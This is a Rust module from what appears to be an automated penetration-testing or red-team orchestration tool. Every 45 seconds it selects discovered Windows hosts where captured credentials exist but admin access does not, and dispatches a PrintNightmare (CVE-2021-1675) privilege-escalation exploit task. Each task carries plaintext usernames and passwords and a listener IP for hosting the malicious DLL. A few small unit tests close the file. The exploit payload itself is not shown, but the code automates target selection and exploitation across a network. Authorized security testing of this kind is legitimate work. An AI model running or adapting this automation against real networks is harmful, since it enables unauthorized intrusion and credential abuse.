//! auto_print_nightmare -- exploit CVE-2021-1675 (PrintNightmare) when
//! conditions are met.
//!
//! PrintNightmare exploits the Print Spooler service to achieve remote code
//! execution. Requires: valid credentials, target with Print Spooler running
//! (most Windows hosts by default), and a writable SMB share for the DLL.
//!
//! This module dispatches `printnightmare` against hosts where we have
//! credentials but NOT admin access — it's a priv esc technique.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Monitors for PrintNightmare exploitation opportunities.
/// Only targets hosts we don't already have admin on.
/// Interval: 45s.
pub async fn auto_print_nightmare(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("printnightmare") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue, // need listener for DLL hosting
        };

        let work: Vec<PrintNightmareWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            // Target all discovered hosts (DCs + member servers)
            for host in &state.hosts {
                let ip = &host.ip;

                // Skip if we already tried PrintNightmare on this host
                if state.is_processed(DEDUP_PRINTNIGHTMARE, ip) {
                    continue;
                }

                // Skip hosts where we already have admin (secretsdump handles those)
                if state.is_processed(DEDUP_SECRETSDUMP, ip) {
                    continue;
                }

                // Infer domain from hostname (e.g. "dc01.contoso.local" → "contoso.local")
                let domain = host
                    .hostname
                    .find('.')
                    .map(|i| host.hostname[i + 1..].to_lowercase())
                    .unwrap_or_default();

                let cred = state
                    .credentials
                    .iter()
                    .find(|c| !domain.is_empty() && c.domain.to_lowercase() == domain)
                    .or_else(|| state.credentials.first());

                let cred = match cred {
                    Some(c) => c.clone(),
                    None => continue,
                };

                items.push(PrintNightmareWork {
                    target_ip: ip.clone(),
                    hostname: host.hostname.clone(),
                    domain: domain.clone(),
                    listener: listener.clone(),
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "printnightmare",
                "target_ip": item.target_ip,
                "hostname": item.hostname,
                "domain": item.domain,
                "listener_ip": item.listener,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("printnightmare");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %item.target_ip,
                        hostname = %item.hostname,
                        "PrintNightmare (CVE-2021-1675) exploitation dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_PRINTNIGHTMARE, item.target_ip.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_PRINTNIGHTMARE, &item.target_ip)
                        .await;
                }
                Ok(None) => {
                    debug!(target = %item.target_ip, "PrintNightmare task deferred");
                }
                Err(e) => {
                    warn!(err = %e, target = %item.target_ip, "Failed to dispatch PrintNightmare");
                }
            }
        }
    }
}

struct PrintNightmareWork {
    target_ip: String,
    hostname: String,
    domain: String,
    listener: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_PRINTNIGHTMARE, "printnightmare");
    }

    #[test]
    fn dedup_key_is_target_ip() {
        let ip = "192.168.58.22";
        assert_eq!(ip, "192.168.58.22");
    }

    #[test]
    fn domain_from_hostname() {
        let hostname = "dc01.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn domain_from_bare_hostname() {
        let hostname = "dc01";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "");
    }
}
